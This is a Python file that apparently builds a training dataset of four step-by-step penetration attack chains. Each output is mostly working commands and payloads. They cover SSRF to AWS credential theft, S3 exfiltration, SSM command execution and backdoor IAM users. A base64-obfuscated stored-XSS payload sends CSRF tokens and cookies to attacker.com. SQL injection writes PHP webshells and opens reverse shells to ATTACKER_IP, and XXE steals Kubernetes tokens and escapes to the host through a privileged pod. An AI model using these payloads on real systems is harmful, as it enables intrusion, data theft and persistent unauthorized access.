#!/usr/bin/env python3
"""
Multi-step attack chain dataset: realistic exploitation scenarios
combining multiple vulnerability classes for complex penetration tests.
"""

from generate_dataset import Sample

ATTACK_CHAIN_SAMPLES = [
    # ── SSRF → IMDSv1 → RCE Chain ───────────────────────────
    Sample(
        instruction="Walk through a complete attack chain: SSRF to AWS credential theft to S3 data exfiltration and EC2 command execution.",
        input="Scope: AWS-hosted SaaS app, SSRF via webhook URL parameter, IMDSv1 enabled",
        output="""## Attack Chain: SSRF → AWS Credential Theft → Full Compromise

### Phase 1: Confirm SSRF and IMDS Access

```bash
# Step 1: Confirm SSRF with out-of-band detection
curl -s "https://target.com/api/webhook" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://YOUR_INTERACTSH_URL/"}'
# Collaborator receives HTTP request → SSRF confirmed

# Step 2: Probe IMDSv1
curl -s "https://target.com/api/webhook" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
# Response: ami-id\nami-launch-index\nhostname\niam/\n...
```

### Phase 2: Steal IAM Credentials

```bash
# Step 3: Get IAM role name
curl -s "https://target.com/api/webhook" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Response: "app-prod-role"

# Step 4: Get credentials
curl -s "https://target.com/api/webhook" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-role"}'
# Response:
# {
#   "AccessKeyId": "ASIA4EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token": "AQoXnyc4lcK4w...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }
```

### Phase 3: Enumerate AWS Permissions

```bash
export AWS_ACCESS_KEY_ID=ASIA4EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...

# Identify who we are
aws sts get-caller-identity
# → arn:aws:sts::123456789:assumed-role/app-prod-role/i-1234567890abcdef0

# Enumerate permissions without being noisy (no cloudtrail-heavy calls)
# Use enumerate-iam tool:
git clone https://github.com/andresriancho/enumerate-iam
python3 enumerate-iam.py --access-key ASIA4EXAMPLE \
    --secret-key KEY --session-token TOKEN

# Quick wins — try common permissions:
aws s3 ls                              # List all buckets
aws secretsmanager list-secrets        # App secrets, DB passwords
aws ssm get-parameters-by-path --path "/" --with-decryption  # Parameter store
aws rds describe-db-instances          # Database info
aws ec2 describe-instances             # All EC2 instances
```

### Phase 4: Data Exfiltration via S3

```bash
# List bucket contents
aws s3 ls s3://company-prod-data/

# Download everything
aws s3 sync s3://company-prod-data/ ./loot/

# Look for credentials in S3
aws s3 cp s3://company-prod-data/.env ./
aws s3 cp s3://company-prod-data/config/database.yml ./

# Search for secrets across all buckets
for bucket in $(aws s3 ls | awk '{print $3}'); do
    aws s3 ls "s3://$bucket" --recursive | grep -E "\.env|config|secret|key|password"
done
```

### Phase 5: Lateral Movement via SSM

```bash
# EC2 instance command execution (no SSH needed!)
# List instances SSM can reach
aws ssm describe-instance-information --query 'InstanceInformationList[*].InstanceId'

# Execute command on all instances
aws ssm send-command \
    --instance-ids "i-1234567890abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["id && cat /etc/shadow && env"]' \
    --query "Command.CommandId"

# Get output
aws ssm get-command-invocation \
    --command-id "COMMAND_ID" \
    --instance-id "i-1234567890abcdef0" \
    --query 'StandardOutputContent'
```

### Phase 6: Persistence

```bash
# Create backdoor IAM user
aws iam create-user --user-name "backup-service"
aws iam create-access-key --user-name "backup-service"
aws iam attach-user-policy \
    --user-name "backup-service" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Or: Lambda backdoor for persistence
aws lambda create-function \
    --function-name "maintenance-lambda" \
    --runtime python3.9 \
    --role arn:aws:iam::123456789:role/app-prod-role \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://backdoor.zip
```

### Timeline Summary

| Step | Action | Time |
|------|--------|------|
| 1 | SSRF confirmation | 5 min |
| 2 | IMDS credential extraction | 2 min |
| 3 | Permission enumeration | 15 min |
| 4 | S3 data exfiltration | 10 min |
| 5 | SSM RCE on all instances | 5 min |
| 6 | Persistence + cleanup | 10 min |
""",
        category="attack_chain",
        subcategory="ssrf_to_aws_rce",
    ),
    # ── XSS → CSRF → Account Takeover ───────────────────────
    Sample(
        instruction="Demonstrate a full attack chain combining stored XSS, CSRF token theft, and account takeover.",
        input="Target: SaaS platform, stored XSS in username field, admin reviews new user profiles",
        output="""## Attack Chain: Stored XSS → Admin CSRF Token Theft → Account Takeover

### Phase 1: Identify Stored XSS

```bash
# Register a new account with XSS payload in username
POST /api/register
Content-Type: application/json

{
  "username": "<img src=x id=pwn onerror=eval(atob(this.id))>",
  "email": "attacker@evil.com",
  "password": "password123"
}
```

Wait for admin to review → XSS fires in admin's browser.

### Phase 2: Craft XSS Payload for CSRF Token Exfiltration

```javascript
// Payload (base64 encoded to avoid filter):
// Step 1: Fetch admin's CSRF token from settings page
// Step 2: Use it to change admin's email
// Step 3: Trigger password reset to attacker's email

const payload = `
(async() => {
  // Get CSRF token from admin settings page
  const settingsPage = await fetch('/admin/settings', {credentials: 'include'});
  const html = await settingsPage.text();
  const csrfMatch = html.match(/csrf[_-]?token['":\\s]+([\\w-]+)/i);
  const csrf = csrfMatch ? csrfMatch[1] : '';

  // Change admin's email to attacker-controlled address
  await fetch('/admin/settings/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-CSRF-Token': csrf
    },
    body: 'email=attacker%40evil.com&csrf_token=' + csrf
  });

  // Exfiltrate confirmation + steal session cookie
  fetch('https://attacker.com/log?csrf=' + encodeURIComponent(csrf) +
        '&cookie=' + encodeURIComponent(document.cookie));
})();
`;

// Base64 encode for <img onerror=eval(atob(this.id))>
console.log(btoa(payload));
```

**Final stored payload in username:**
```html
<img src=x id="KGFzeW5jKCk9PnsKICA..." onerror="eval(atob(this.id))">
```

### Phase 3: Admin Visits Profile → Payload Fires

When admin visits `/admin/users/new` to review new accounts:
1. `<img>` onerror fires → executes base64 payload
2. Fetches admin's settings page → extracts CSRF token
3. Changes admin's email to `attacker@evil.com`
4. Sends CSRF token + cookie to attacker

### Phase 4: Account Takeover

```bash
# Attacker has admin's email now → trigger password reset
curl -X POST https://target.com/auth/forgot-password \
  -d "email=attacker@evil.com"

# Receives reset email → sets new password → full admin access
```

### Phase 5: Escalation — Backdoor Creation

Once admin access is gained:
```javascript
// Create a new admin user as persistent backdoor
const csrf = 'TOKEN_FROM_EXFIL';
fetch('/admin/users/create', {
  method: 'POST',
  credentials: 'include',
  headers: {'X-CSRF-Token': csrf},
  body: JSON.stringify({
    username: 'support_backup',
    password: 'StrongPass!2024',
    role: 'administrator',
    email: 'backup@attacker.com'
  })
});
```

### Key Techniques Used

| Technique | Purpose |
|-----------|---------|
| Stored XSS | Initial foothold in admin context |
| Same-origin fetch | Bypass CORS to read CSRF token |
| CSRF token theft | Forge authenticated requests |
| Email change | Enable password reset |
| Password reset | Full account takeover |
| Backdoor account | Maintain persistence |

### Defenses to Verify

- [ ] XSS: Output encoding in username display
- [ ] CSRF: Is the token tied to session (not just present)?
- [ ] Email change: Requires current password confirmation?
- [ ] Email change: Sends confirmation to OLD email?
- [ ] Admin reviewing users: Sandboxed/read-only view?
""",
        category="attack_chain",
        subcategory="xss_csrf_ato",
    ),
    # ── SQLi → File Write → RCE Chain ───────────────────────
    Sample(
        instruction="Explain the attack chain from SQL injection to RCE via file write in a MySQL environment with FILE privilege.",
        input="Target: MySQL 5.7 running as root (misconfigured), web root at /var/www/html/",
        output="""## Attack Chain: SQLi → MySQL FILE Privilege → Webshell → RCE

### Prerequisites

- MySQL user has FILE privilege (`GRANT FILE ON *.* TO 'app'@'localhost'`)
- `secure_file_priv` is empty or points to web-accessible directory
- Web server document root is writable by MySQL process

### Phase 1: Confirm FILE Privilege via SQLi

```sql
-- Check current user
' UNION SELECT user(),2,3--

-- Check FILE privilege
' UNION SELECT (SELECT COUNT(*) FROM information_schema.USER_PRIVILEGES
  WHERE GRANTEE=concat(char(39),user(),char(39))
  AND PRIVILEGE_TYPE='FILE'), 2, 3--

-- Confirm secure_file_priv setting
' UNION SELECT @@secure_file_priv, 2, 3--
-- Result: empty string → no restriction!

-- Verify web root is writable (try reading a known file)
' UNION SELECT LOAD_FILE('/var/www/html/index.php'), 2, 3--
```

### Phase 2: Write Webshell

```sql
-- Write PHP webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>', 2, 3
INTO OUTFILE '/var/www/html/images/thumbnail.php'--

-- Alternative: more functional shell
' UNION SELECT '<?php if(isset($_POST["c"])){system($_POST["c"]);}?>',2,3
INTO OUTFILE '/var/www/html/.htpass.php'--

-- Obfuscated (if basic WAF present):
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,2,3
INTO OUTFILE '/var/www/html/img/t.php'--
```

### Phase 3: Verify Webshell

```bash
curl "https://target.com/images/thumbnail.php?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Better: use curl for interactive commands
curl -s "https://target.com/images/thumbnail.php?cmd=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("cat /etc/passwd"))')"
```

### Phase 4: Upgrade to Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Via webshell
curl "https://target.com/images/thumbnail.php" --data-urlencode \
  "c=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Alternative: Python reverse shell (more reliable)
curl "https://target.com/images/thumbnail.php" --data-urlencode \
  "c=python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\""
```

### Phase 5: Privilege Escalation (if www-data)

```bash
# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo rights
sudo -l

# Read sensitive files
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -i password
find / -name "*.env" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null | xargs cat

# Check for writable crontabs
ls -la /etc/cron*
cat /etc/crontab

# Check running services
ps aux | grep -E "root|mysql|postgres"
ss -tlnp
```

### Alternative: UDF (User Defined Function) RCE

If web root is not writable but plugin directory is:
```sql
-- Find plugin directory
' UNION SELECT @@plugin_dir, 2, 3--

-- Find existing UDF malicious shared library via MySQL exploit kit
-- Or: use lib_mysqludf_sys

-- Upload UDF library
' UNION SELECT 0x<HEX_OF_LIB_MYSQLUDF_SYS.SO>, 2, 3
INTO DUMPFILE '/usr/lib/mysql/plugin/sys_exec.so'--

-- Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'sys_exec.so';

-- Execute commands
SELECT sys_exec('cp /bin/bash /tmp/backdash && chmod +xs /tmp/backdash');
-- Now: /tmp/backdash -p → root shell
```

### SQLMap Automation

```bash
# Full chain automated
sqlmap -u "https://target.com/item?id=1" \
    --dbms=mysql \
    --file-write=/tmp/shell.php \
    --file-dest=/var/www/html/shell.php \
    --batch

# With OS shell
sqlmap -u "https://target.com/item?id=1" --os-shell --batch
```
""",
        category="attack_chain",
        subcategory="sqli_to_rce",
    ),
    # ── XXE → SSRF → Internal API → Data Breach ─────────────
    Sample(
        instruction="Describe the attack chain: XXE-based SSRF to enumerate and attack internal microservices.",
        input="Target: Kubernetes cluster, XML document processing endpoint accessible from internet",
        output="""## Attack Chain: XXE → Internal SSRF → Kubernetes API → Cluster Takeover

### Phase 1: Confirm XXE with DNS OOB

```xml
POST /api/process-document
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR.oastify.com/xxe-test">
]>
<document><body>&xxe;</body></document>
```
If Collaborator receives HTTP request → XXE with SSRF confirmed.

### Phase 2: Enumerate Internal Network via XXE-SSRF

```xml
<!-- Probe Kubernetes API server (default port 6443 or 8443) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://10.96.0.1:443/">
]>
```

```python
# Automate subnet scan via XXE
import requests, re
from concurrent.futures import ThreadPoolExecutor

def probe_host(ip, port=443):
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://' + ip + ':' + str(port) + '/">]>'
        '<doc>&xxe;</doc>'
    )
    resp = requests.post(
        'https://target.com/api/process-document',
        data=payload,
        headers={'Content-Type': 'application/xml'},
        timeout=5
    )
    # Distinguish open vs closed by response content/time
    return ip, port, len(resp.content)

with ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(probe_host, f"10.0.{i}.{j}")
               for i in range(0,3) for j in range(1,255)]
```

### Phase 3: Access Kubernetes Service Account Token

```xml
<!-- Read service account JWT (mounted in all pods) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
]>
<document><body>&xxe;</body></document>
```
→ Returns a Kubernetes JWT token for the pod's service account.

### Phase 4: Query Kubernetes API with Stolen Token

```bash
TOKEN="eyJhbGci..."  # from XXE

# Check permissions
curl -k https://10.96.0.1:443/api/v1/namespaces \
  -H "Authorization: Bearer $TOKEN"

# List secrets (if permission granted)
curl -k https://10.96.0.1:443/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN" | jq '.items[].data'

# Decode secret
echo "BASE64_VALUE" | base64 -d

# List all pods
curl -k https://10.96.0.1:443/api/v1/pods \
  -H "Authorization: Bearer $TOKEN"
```

### Phase 5: Privilege Escalation (if Privileged Pod Creation Allowed)

```bash
# Create privileged pod to escape to host
cat > evil-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: maintenance-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: main
    image: alpine
    command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -k -X POST https://10.96.0.1:443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  --data-binary @evil-pod.yaml

# Exec into pod → full host access
curl -k -X POST \
  "https://10.96.0.1:443/api/v1/namespaces/default/pods/maintenance-pod/exec?command=id&container=main&stdin=true&stdout=true&tty=true" \
  -H "Authorization: Bearer $TOKEN"
```

### Phase 6: Exfiltrate All Cluster Secrets

```bash
# Dump all secrets across all namespaces
for ns in $(kubectl --token=$TOKEN get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  kubectl --token=$TOKEN get secrets -n $ns -o json | \
    jq -r '.items[] | .metadata.name + ": " + (.data | to_entries[] | .key + "=" + (.value | @base64d))'
done 2>/dev/null

# Typical high-value secrets:
# - Database connection strings
# - AWS/GCP/Azure credentials
# - TLS private keys
# - API keys for third-party services
```

### Attack Tree Summary

```
XXE confirmed (OOB DNS)
├── File Read: /var/run/secrets/.../token
│   └── Kubernetes API access with pod service account
│       ├── List/read secrets → DB creds, API keys
│       ├── Create privileged pod → Host escape
│       └── Lateral movement to other namespaces
└── SSRF to internal services
    ├── Internal admin panels (no auth required)
    ├── Etcd (port 2379) → all cluster data
    └── Cloud metadata → IAM credentials
```
""",
        category="attack_chain",
        subcategory="xxe_ssrf_k8s",
    ),
]
